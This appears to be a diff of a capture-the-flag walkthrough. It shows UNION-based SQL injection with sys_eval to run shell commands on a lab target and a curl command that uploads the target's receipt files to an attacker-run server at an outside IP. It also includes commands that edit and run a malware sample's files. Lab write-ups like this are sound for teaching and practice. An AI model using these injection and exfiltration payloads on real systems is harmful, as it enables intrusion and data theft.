@@ -29,10 +29,19 @@
 >	- Enumerating the machine to view directories using, `/os_sqli.php?user=lannister' UNION SELECT 1,2,3,4,sys_eval('ls /home/receipts') -- //`the directory `/home/recipes/` contain encrypted files.![](recipe-files.png)
 >	- Going back to the table names found, the table `transactions` is interesting in this case.
 >	- Getting the column names and enumerating the content using the same process as before.![](transactions-table.png)
->	- The receiver's address is `tWuNGTaSBNJq7mvxF5AetFg4B2VE41MnYs`.
 >	- To decrypt the file, we have to transfer the entire directory first to the attacking machine.
 >	- Using Python's `uploadserver` module on the attacking machine
 >		- Create a directory to upload in.
->		- start the server using `sudo python3 -m uploadserver 443`.
->		- Using `curl -X POST https://10.9.224.110/upload -F 'files=@/home/receipts/<file-name>'` command inside the `/os_sqli.php?user=lannister' UNION SELECT 1,2,3,4,sys_eval('') -- //` command on each file in the directory.
+>		- start the server using `python3 -m uploadserver 8000`.
+>		- Using `curl -X POST http://10.9.224.110:8000/upload -F 'files=@/home/receipts/<file-name>'` command inside the `/os_sqli.php?user=lannister' UNION SELECT 1,2,3,4,sys_eval('') -- //` command on each file in the directory.
 >		- ![](file-upload.png)
+>	- Now, using the found addresses, decrypt the files using `gpg --decrypt <file-name>` and when prompted for a key use the address.![](file-decrypted.png)
+## *TASK 6*
+>	- Using `/os_sqli.php?user=lannister' UNION SELECT 1,2,3,4,sys_eval('ls%20 "/home/products/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0"') -- //` to view the content of the malware directory.![](malware-dir.png)
+>	- Looking at the `readme.txt` file.![](malware-readme.png)
+>	- Viewing the content of the `config.ini` file.![](malware-config.png)
+>	- Using `/os_sqli.php?user=lannister' UNION SELECT 1,2,3,4,sys_eval('echo "debug=true" > "/home/products/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0/config.ini"') -- //` to change the value of the debug to true to stop the effect of the malware.![](malware-new-config.png)
+>	- From the name of the file `mmmmbar.nim`, the programming language can be found.
+>	- By inspecting the malware file with `/os_sqli.php?user=lannister' UNION SELECT 1,2,3,4,sys_eval('tail -n +20 "/home/products/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0/mmmbar.nim"') -- //`, the file type can be found.![](malware.png)
+>	- Running the "defanged" malware with `/os_sqli.php?user=lannister' UNION SELECT 1,2,3,4,sys_eval('nim "/home/products/malware/4sale/pal4t1n3/MisterMeist3r/2DC6C0/mmmbar.nim"') -- //` to view the flag.![](flag.png)
+>	- 
